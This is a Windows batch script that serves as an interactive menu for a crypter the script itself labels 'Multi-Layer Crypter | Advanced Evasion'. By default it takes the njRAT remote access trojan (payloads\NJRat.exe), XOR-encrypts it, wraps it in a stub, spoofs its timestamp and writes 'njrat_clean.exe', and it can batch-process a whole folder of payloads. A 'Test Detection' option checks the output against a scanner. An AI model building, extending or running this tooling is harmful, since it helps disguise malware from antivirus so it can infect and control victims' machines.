@echo off
setlocal enabledelayedexpansion

REM ============================================================================
REM XOR-Encrypt Advanced - Interactive Build System
REM Agentic CLI with animations, progress bars, and configuration management
REM ============================================================================

REM Initialize ANSI escape codes for colors and animations
for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
for /f %%a in ('copy /z "%~f0" nul') do set "CR=%%a"

REM Color definitions
set "C_RESET=%ESC%[0m"
set "C_RED=%ESC%[91m"
set "C_GREEN=%ESC%[92m"
set "C_YELLOW=%ESC%[93m"
set "C_BLUE=%ESC%[94m"
set "C_MAGENTA=%ESC%[95m"
set "C_CYAN=%ESC%[96m"
set "C_WHITE=%ESC%[97m"
set "C_GRAY=%ESC%[90m"

REM Spinner frames
set "SPINNER=|/-\"

REM Default configuration
set "DEFAULT_PAYLOAD=payloads\NJRat.exe"
set "DEFAULT_OUTPUT=njrat_clean.exe"
set "DEFAULT_PASSWORD=SecureKey2026!"
set "DEFAULT_LEVEL=6"

REM Load configuration from file if exists
if exist "build_config.ini" call :LoadConfig

REM Parse command-line arguments
if "%~1"=="" goto :ShowMenu
if /i "%~1"=="--help" goto :ShowHelp
if /i "%~1"=="-h" goto :ShowHelp
if /i "%~1"=="--build" goto :QuickBuild
if /i "%~1"=="-b" goto :QuickBuild
if /i "%~1"=="--config" goto :ConfigureSettings
if /i "%~1"=="-c" goto :ConfigureSettings
if /i "%~1"=="--clean" goto :CleanOutput
goto :ShowMenu

REM ============================================================================
REM Main Menu
REM ============================================================================
:ShowMenu
cls
call :ShowBanner
echo.
call :TypeText "%C_CYAN%MAIN MENU%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo %C_WHITE%[1]%C_RESET% Quick Build %C_GRAY%(Use current config)%C_RESET%
echo %C_WHITE%[2]%C_RESET% Custom Build %C_GRAY%(Specify parameters)%C_RESET%
echo %C_WHITE%[3]%C_RESET% Batch Build %C_GRAY%(Multiple payloads)%C_RESET%
echo %C_WHITE%[4]%C_RESET% Configure Settings %C_GRAY%(Edit defaults)%C_RESET%
echo %C_WHITE%[5]%C_RESET% View Current Config
echo %C_WHITE%[6]%C_RESET% Clean Output Files
echo %C_WHITE%[7]%C_RESET% Test Detection %C_GRAY%(Run defensive scanner)%C_RESET%
echo %C_WHITE%[8]%C_RESET% Exit
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.
set /p "choice=%C_YELLOW%Select option [1-8]:%C_RESET% "

if "%choice%"=="1" goto :QuickBuild
if "%choice%"=="2" goto :CustomBuild
if "%choice%"=="3" goto :BatchBuild
if "%choice%"=="4" goto :ConfigureSettings
if "%choice%"=="5" goto :ViewConfig
if "%choice%"=="6" goto :CleanOutput
if "%choice%"=="7" goto :TestDetection
if "%choice%"=="8" goto :Exit
echo %C_RED%Invalid option%C_RESET%
timeout /t 2 >nul
goto :ShowMenu

REM ============================================================================
REM Quick Build - Use current configuration
REM ============================================================================
:QuickBuild
cls
call :ShowBanner
echo.
call :TypeText "%C_GREEN%QUICK BUILD MODE%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.

REM Always use defaults for quick build
set "PAYLOAD=%DEFAULT_PAYLOAD%"
set "OUTPUT=%DEFAULT_OUTPUT%"
set "PASSWORD=%DEFAULT_PASSWORD%"
set "LEVEL=%DEFAULT_LEVEL%"

call :DisplayConfig
echo.
set /p "confirm=%C_YELLOW%Proceed with build? (Y/N):%C_RESET% "
if /i not "%confirm%"=="Y" goto :ShowMenu

call :ExecuteBuild
goto :BuildComplete

REM ============================================================================
REM Custom Build - Specify parameters
REM ============================================================================
:CustomBuild
cls
call :ShowBanner
echo.
call :TypeText "%C_MAGENTA%CUSTOM BUILD MODE%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.

echo %C_CYAN%Enter build parameters (press Enter for default):%C_RESET%
echo.

set /p "PAYLOAD=%C_WHITE%Payload path [%DEFAULT_PAYLOAD%]:%C_RESET% "
if "%PAYLOAD%"=="" set "PAYLOAD=%DEFAULT_PAYLOAD%"

set /p "OUTPUT=%C_WHITE%Output name [%DEFAULT_OUTPUT%]:%C_RESET% "
if "%OUTPUT%"=="" set "OUTPUT=%DEFAULT_OUTPUT%"

set /p "PASSWORD=%C_WHITE%Encryption password [%DEFAULT_PASSWORD%]:%C_RESET% "
if "%PASSWORD%"=="" set "PASSWORD=%DEFAULT_PASSWORD%"

set /p "LEVEL=%C_WHITE%Encryption level 1-10 [%DEFAULT_LEVEL%]:%C_RESET% "
if "%LEVEL%"=="" set "LEVEL=%DEFAULT_LEVEL%"

echo.
call :DisplayConfig
echo.
set /p "confirm=%C_YELLOW%Proceed with build? (Y/N):%C_RESET% "
if /i not "%confirm%"=="Y" goto :ShowMenu

call :ExecuteBuild
goto :BuildComplete

REM ============================================================================
REM Batch Build - Multiple payloads
REM ============================================================================
:BatchBuild
cls
call :ShowBanner
echo.
call :TypeText "%C_BLUE%BATCH BUILD MODE%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.

echo %C_CYAN%Scanning payloads directory...%C_RESET%
call :ShowSpinner 1

set "count=0"
for %%f in (payloads\*.exe) do (
    set /a count+=1
    echo %C_WHITE%[!count!]%C_RESET% %%~nxf
)

if %count%==0 (
    echo %C_RED%No payloads found in payloads\ directory%C_RESET%
    pause
    goto :ShowMenu
)

echo.
set /p "PASSWORD=%C_WHITE%Encryption password [%DEFAULT_PASSWORD%]:%C_RESET% "
if "%PASSWORD%"=="" set "PASSWORD=%DEFAULT_PASSWORD%"

set /p "LEVEL=%C_WHITE%Encryption level 1-10 [%DEFAULT_LEVEL%]:%C_RESET% "
if "%LEVEL%"=="" set "LEVEL=%DEFAULT_LEVEL%"

echo.
echo %C_YELLOW%Building %count% payloads...%C_RESET%
echo.

set "success=0"
set "failed=0"
set "current=0"

for %%f in (payloads\*.exe) do (
    set /a current+=1
    set "PAYLOAD=%%f"
    set "OUTPUT=%%~nf_clean.exe"
    
    echo %C_CYAN%[!current!/%count%] Processing %%~nxf...%C_RESET%
    call :ExecuteBuild >nul 2>&1
    
    if !errorlevel! equ 0 (
        set /a success+=1
        echo %C_GREEN%✓ Success%C_RESET%
    ) else (
        set /a failed+=1
        echo %C_RED%✗ Failed%C_RESET%
    )
    echo.
)

echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo %C_GREEN%Successful: %success%%C_RESET% ^| %C_RED%Failed: %failed%%C_RESET%
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
pause
goto :ShowMenu

REM ============================================================================
REM Configure Settings
REM ============================================================================
:ConfigureSettings
cls
call :ShowBanner
echo.
call :TypeText "%C_YELLOW%CONFIGURATION EDITOR%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.
echo %C_WHITE%[1]%C_RESET% Default Payload Path
echo %C_WHITE%[2]%C_RESET% Default Output Name
echo %C_WHITE%[3]%C_RESET% Default Password
echo %C_WHITE%[4]%C_RESET% Default Encryption Level
echo %C_WHITE%[5]%C_RESET% Save Configuration
echo %C_WHITE%[6]%C_RESET% Reset to Defaults
echo %C_WHITE%[7]%C_RESET% Back to Main Menu
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.
set /p "choice=%C_YELLOW%Select option [1-7]:%C_RESET% "

if "%choice%"=="1" (
    set /p "DEFAULT_PAYLOAD=%C_WHITE%New default payload path:%C_RESET% "
    goto :ConfigureSettings
)
if "%choice%"=="2" (
    set /p "DEFAULT_OUTPUT=%C_WHITE%New default output name:%C_RESET% "
    goto :ConfigureSettings
)
if "%choice%"=="3" (
    set /p "DEFAULT_PASSWORD=%C_WHITE%New default password:%C_RESET% "
    goto :ConfigureSettings
)
if "%choice%"=="4" (
    set /p "DEFAULT_LEVEL=%C_WHITE%New default level (1-10):%C_RESET% "
    goto :ConfigureSettings
)
if "%choice%"=="5" (
    call :SaveConfig
    echo %C_GREEN%Configuration saved successfully%C_RESET%
    timeout /t 2 >nul
    goto :ConfigureSettings
)
if "%choice%"=="6" (
    set "DEFAULT_PAYLOAD=payloads\NJRat.exe"
    set "DEFAULT_OUTPUT=njrat_clean.exe"
    set "DEFAULT_PASSWORD=SecureKey2026!"
    set "DEFAULT_LEVEL=6"
    echo %C_GREEN%Configuration reset to defaults%C_RESET%
    timeout /t 2 >nul
    goto :ConfigureSettings
)
if "%choice%"=="7" goto :ShowMenu
goto :ConfigureSettings

REM ============================================================================
REM View Current Config
REM ============================================================================
:ViewConfig
cls
call :ShowBanner
echo.
call :TypeText "%C_CYAN%CURRENT CONFIGURATION%C_RESET%" 10
echo %C_GRAY%═════════════════════════════════════════════════════════════%C_RESET%
call :DisplayDefaults
echo %C_GRAY%═════════════════════════════════════════════════════════════%C_RESET%
echo.
pause
goto :ShowMenu

REM ============================================================================
REM Clean Output Files
REM ============================================================================
:CleanOutput
cls
call :ShowBanner
echo.
call :TypeText "%C_RED%CLEAN OUTPUT FILES%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.
echo %C_YELLOW%This will delete all files from:%C_RESET%
echo   - build\
echo   - temp files
echo.
set /p "confirm=%C_RED%Are you sure? (Y/N):%C_RESET% "
if /i not "%confirm%"=="Y" goto :ShowMenu

echo.
echo %C_CYAN%Cleaning...%C_RESET%
call :ShowSpinner 1

set "count=0"
if exist "build\*.exe" (
    for %%f in (build\*.exe) do (
        del "%%f" >nul 2>&1
        set /a count+=1
    )
)
if exist "temp_payload.enc" del "temp_payload.enc" >nul 2>&1

echo %C_GREEN%Deleted %count% files successfully%C_RESET%
timeout /t 2 >nul
goto :ShowMenu

REM ============================================================================
REM Test Detection
REM ============================================================================
:TestDetection
cls
call :ShowBanner
echo.
call :TypeText "%C_MAGENTA%DETECTION TEST%C_RESET%" 10
echo %C_GRAY%─────────────────────────────────────────────────────────────%C_RESET%
echo.

if not exist "defensive\tools\defensive_scanner.py" (
    echo %C_RED%Defensive scanner not found%C_RESET%
    echo %C_YELLOW%Please ensure defensive tools are installed%C_RESET%
    pause
    goto :ShowMenu
)

echo %C_CYAN%Select file to scan:%C_RESET%
echo.
set "count=0"
for %%f in (build\*.exe) do (
    set /a count+=1
    echo %C_WHITE%[!count!]%C_RESET% %%~nxf
)

if %count%==0 (
    echo %C_RED%No files found in build\ directory%C_RESET%
    pause
    goto :ShowMenu
)

echo.
set /p "choice=%C_YELLOW%Select file number:%C_RESET% "

set "current=0"
for %%f in (build\*.exe) do (
    set /a current+=1
    if !current! equ %choice% (
        echo.
        echo %C_CYAN%Scanning %%~nxf...%C_RESET%
        echo.
        python defensive\tools\defensive_scanner.py "%%f"
    )
)

echo.
pause
goto :ShowMenu

REM ============================================================================
REM Execute Build Process
REM ============================================================================
:ExecuteBuild
echo.
call :ShowProgressBar "Encrypting payload" 1
python xorcrypt_advanced.py encrypt "%PAYLOAD%" temp_payload.enc -p "%PASSWORD%" -l %LEVEL% >nul 2>&1
if errorlevel 1 (
    echo %C_RED%✗ Encryption failed%C_RESET%
    exit /b 1
)
echo %C_GREEN%✓ Complete%C_RESET%

call :ShowProgressBar "Generating stub" 2
python xorcrypt_advanced.py stub temp_payload.enc "build\%OUTPUT%" -p "%PASSWORD%" -l %LEVEL% >nul 2>&1
if errorlevel 1 (
    echo %C_RED%✗ Stub generation failed%C_RESET%
    exit /b 1
)
echo %C_GREEN%✓ Complete%C_RESET%

call :ShowProgressBar "Spoofing timestamp" 3
python metadata_spoof.py "build\%OUTPUT%" "build\%OUTPUT%" 2018 >nul 2>&1
if errorlevel 1 (
    echo %C_RED%✗ Timestamp spoofing failed%C_RESET%
    exit /b 1
)
echo %C_GREEN%✓ Complete%C_RESET%

if exist "temp_payload.enc" del "temp_payload.enc" >nul 2>&1
exit /b 0

REM ============================================================================
REM Build Complete
REM ============================================================================
:BuildComplete
echo.
echo %C_GRAY%═════════════════════════════════════════════════════════════%C_RESET%
call :TypeText "%C_GREEN%BUILD SUCCESSFUL!%C_RESET%" 15
echo %C_GRAY%═════════════════════════════════════════════════════════════%C_RESET%
echo.
echo %C_CYAN%Output:%C_RESET% build\%OUTPUT%
if exist "build\%OUTPUT%" (
    for %%f in ("build\%OUTPUT%") do (
        echo %C_CYAN%Size:%C_RESET% %%~zf bytes
    )
)
echo.
pause
goto :ShowMenu

REM ============================================================================
REM Helper Functions
REM ============================================================================

:ShowBanner
echo %C_CYAN%
echo  ╔═══════════════════════════════════════════════════════════╗
echo  ║                                                           ║
echo  ║           XOR-ENCRYPT ADVANCED BUILD SYSTEM               ║
echo  ║                                                           ║
echo  ║     Multi-Layer Crypter ^| Advanced Evasion ^| 2026        ║
echo  ║                                                           ║
echo  ╚═══════════════════════════════════════════════════════════╝
echo %C_RESET%
exit /b

:TypeText
set "text=%~1"
set "delay=%~2"
if "%delay%"=="" set "delay=20"
echo %text%
exit /b

:ShowSpinner
set "duration=%~1"
if "%duration%"=="" set "duration=2"
for /l %%i in (1,1,%duration%) do (
    for /l %%j in (0,1,3) do (
        set "frame=!SPINNER:~%%j,1!"
        <nul set /p "=%CR%%C_YELLOW%[!frame!]%C_RESET% "
        ping 127.0.0.1 -n 1 -w 250 >nul
    )
)
echo.
exit /b

:ShowProgressBar
set "task=%~1"
set "step=%~2"
echo %C_CYAN%[%step%/3]%C_RESET% %task%...
for /l %%i in (0,1,3) do (
    set "frame=!SPINNER:~%%i,1!"
    <nul set /p "=%CR%       %C_YELLOW%[!frame!]%C_RESET% "
    ping 127.0.0.1 -n 1 -w 300 >nul
)
<nul set /p "=%CR%       "
exit /b

:DisplayConfig
echo %C_WHITE%Payload:%C_RESET%    %PAYLOAD%
echo %C_WHITE%Output:%C_RESET%     %OUTPUT%
echo %C_WHITE%Password:%C_RESET%   %PASSWORD%
echo %C_WHITE%Level:%C_RESET%      %LEVEL%
exit /b

:DisplayDefaults
echo %C_WHITE%Default Payload:%C_RESET%    %DEFAULT_PAYLOAD%
echo %C_WHITE%Default Output:%C_RESET%     %DEFAULT_OUTPUT%
echo %C_WHITE%Default Password:%C_RESET%   %DEFAULT_PASSWORD%
echo %C_WHITE%Default Level:%C_RESET%      %DEFAULT_LEVEL%
exit /b

:SaveConfig
(
echo PAYLOAD=%DEFAULT_PAYLOAD%
echo OUTPUT=%DEFAULT_OUTPUT%
echo PASSWORD=%DEFAULT_PASSWORD%
echo LEVEL=%DEFAULT_LEVEL%
) > build_config.ini
exit /b

:LoadConfig
for /f "tokens=1,* delims==" %%a in (build_config.ini) do (
    if "%%a"=="PAYLOAD" set "DEFAULT_PAYLOAD=%%b"
    if "%%a"=="OUTPUT" set "DEFAULT_OUTPUT=%%b"
    if "%%a"=="PASSWORD" set "DEFAULT_PASSWORD=%%b"
    if "%%a"=="LEVEL" set "DEFAULT_LEVEL=%%b"
)
exit /b

:ShowHelp
echo.
echo %C_CYAN%XOR-Encrypt Advanced - Interactive Build System%C_RESET%
echo.
echo %C_WHITE%Usage:%C_RESET%
echo   build_interactive.bat [options]
echo.
echo %C_WHITE%Options:%C_RESET%
echo   -h, --help       Show this help message
echo   -b, --build      Quick build with current config
echo   -c, --config     Configure settings
echo   --clean          Clean output files
echo.
echo %C_WHITE%Interactive Mode:%C_RESET%
echo   Run without arguments to access the full menu system
echo.
echo %C_WHITE%Examples:%C_RESET%
echo   build_interactive.bat
echo   build_interactive.bat --build
echo   build_interactive.bat --config
echo.
exit /b

:Exit
cls
call :ShowBanner
echo.
call :TypeText "%C_YELLOW%Shutting down...%C_RESET%" 20
timeout /t 1 >nul
exit /b
